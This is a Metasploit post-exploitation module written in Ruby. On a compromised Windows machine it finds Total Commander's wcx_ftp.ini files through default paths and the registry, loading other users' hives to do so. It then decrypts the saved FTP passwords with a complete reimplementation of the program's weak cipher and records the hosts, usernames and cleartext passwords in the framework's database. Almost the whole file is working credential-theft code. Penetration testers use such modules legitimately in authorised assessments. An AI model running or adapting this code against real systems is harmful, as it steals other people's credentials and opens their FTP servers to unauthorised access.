##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'rex/parser/ini'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/post/windows/registry'
require 'msf/core/auxiliary/report'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles
	include Msf::Post::File


	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Gather Total Commander Saved Password Extraction',
				'Description'   => %q{
					This module extracts weakly encrypted saved FTP Passwords from Total Commander.
					It finds saved FTP connections in the wcx_ftp.ini file.
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'theLightCosine'],
				'Platform'      => [ 'win' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		print_status("Checking Default Locations...")
		check_systemroot

		grab_user_profiles().each do |user|
			next if user['AppData'] == nil
			next if user['ProfileDir'] == nil
			check_userdir(user['ProfileDir'])
			check_appdata(user['AppData'])
		end

		commander_key = "HKLM\\Software\\Ghisler\\Total Commander"
		hklmpath = registry_getvaldata(commander_key, 'FtpIniName')
		case hklmpath
		when nil
			print_status("Total Commander Does not Appear to be Installed Globally")
		when "wcx_ftp.ini"
			print_status("Already Checked SYSTEMROOT")
		when ".\\wcx_ftp.ini"
			hklminstpath = registry_getvaldata(commander_key, 'InstallDir') || ''
			if hklminstpath.empty?
				print_error("Unable to find InstallDir in registry, skipping wcx_ftp.ini")
			else
				check_other(hklminstpath +'\\wcx_ftp.ini')
			end
		when /APPDATA/
			print_status("Already Checked AppData")
		when /USERPROFILE/
			print_status("Already Checked USERPROFILE")
		else
			check_other(hklmpath)
		end

		userhives=load_missing_hives()
		userhives.each do |hive|
			next if hive['HKU'] == nil
			print_status("Looking at Key #{hive['HKU']}")
			profile_commander_key = "#{hive['HKU']}\\Software\\Ghisler\\Total Commander"
			hkupath = registry_getvaldata(profile_commander_key, 'FtpIniName')
			print_status("HKUP: #{hkupath}")
			case hkupath
			when nil
				print_status("Total Commander Does not Appear to be Installed on This User")
			when "wcx_ftp.ini"
				print_status("Already Checked SYSTEMROOT")
			when ".\\wcx_ftp.ini"
				hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir') || ''
				if hklminstpath.empty?
					print_error("Unable to find InstallDir in registry, skipping wcx_ftp.ini")
				else
					check_other(hklminstpath +'\\wcx_ftp.ini')
				end
			when /APPDATA/
				print_status("Already Checked AppData")

			when /USERPROFILE/
				print_status("Already Checked USERPROFILE")
			else
				check_other(hkupath)
			end
		end
		unload_our_hives(userhives)

	end


	def check_userdir(path)
		filename = "#{path}\\wcx_ftp.ini"
		check_other(filename)
	end

	def check_appdata(path)
		filename = "#{path}\\GHISLER\\wcx_ftp.ini"
		check_other(filename)
	end

	def check_systemroot
		winpath = expand_path("%SYSTEMROOT%")+'\\wcx_ftp.ini'
		check_other(winpath)
	end

	def check_other(filename)
		if file?(filename)
			print_status("Found File at #{filename}")
			get_ini(filename)
		else
			print_status("#{filename} not found ....")
		end
	end

	def get_ini(filename)
		config = client.fs.file.new(filename,'r')
		parse = config.read
		ini=Rex::Parser::Ini.from_s(parse)

		ini.each_key do |group|
			next if group=="General" or group == "default" or group=="connections"
			print_status("Processing Saved Session #{group}")
			host = ini[group]['host']

			username = ini[group]['username']
			passwd = ini[group]['password']
			next if passwd==nil
			passwd = decrypt(passwd)
			(host,port) = host.split(':')
			port=21 if port==nil
			print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
			if session.db_record
				source_id = session.db_record.id
			else
				source_id = nil
			end
			report_auth_info(
				:host  => host,
				:port => port,
				:sname => 'ftp',
				:source_id => source_id,
				:source_type => "exploit",
				:user => username,
				:pass => passwd
			)
		end
	end

	def seed(nMax)
		@vseed = ((@vseed * 0x8088405) & 0xffffffff) +1
		return (((@vseed * nMax) >> 32)& 0xffffffff)
	end

	def shift(n1, n2)
		first= (n1 << n2) & 0xffffffff
		second = (n1 >> (8 - n2)) & 0xffffffff
		retval= (first | second) &  0xff
		return retval
	end

	def decrypt(pwd)

		pwd2=[]

		pwd.scan(/../) { |a| pwd2 << (a.to_i 16) }

		len= (pwd2.length) -4

		pwd3=[]
		@vseed = 849521
		pwd2.each do |a|
			blah = seed(8)
			blah2 = shift(a, blah)
			pwd3 << blah2
		end

		@vseed =12345
		(0..255).each do |i|
			a=seed(len)
			b=seed(len)
			t=pwd3[a]
			pwd3[a] = pwd3[b]
			pwd3[b]=t
		end


		@vseed =42340
		(0..len).each do |i|
			pwd3[i] = (pwd3[i] ^ seed(256)) & 0xff
		end


		@vseed =54321
		(0..len).each do |i|
			foo = seed(256)
			pwd3[i] =  (pwd3[i] - foo) & 0xff
		end


		fpwd=""
		pwd3[0,len].map{|a| fpwd << a.chr}
		return fpwd

	end
end
